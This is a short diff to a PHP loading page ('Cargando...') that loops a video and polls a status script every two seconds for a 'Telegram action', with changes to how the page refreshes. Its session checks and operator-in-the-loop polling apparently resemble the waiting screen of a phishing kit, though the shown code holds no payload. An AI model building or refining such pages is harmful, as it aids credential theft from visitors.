@@ -55,6 +55,7 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     <meta charset="UTF-8">
     <title>Cargando...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="2">
     <style>
         body {
             margin: 0;
@@ -82,18 +83,11 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
 </head>
 <body>
     <div class="video-container">
-        <video id="cargaVideo" autoplay muted playsinline>
+        <video autoplay loop muted playsinline>
             <source src="cargaout.MP4" type="video/mp4">
         </video>
     </div>
     <script>
-        const video = document.getElementById("cargaVideo");
-        
-        // Cuando el video termine, recargar la página
-        video.addEventListener("ended", function() {
-            window.location.reload();
-        });
-        
         // Verificar acción de Telegram cada 2 segundos
         setInterval(function() {
             fetch("../check_status.php")
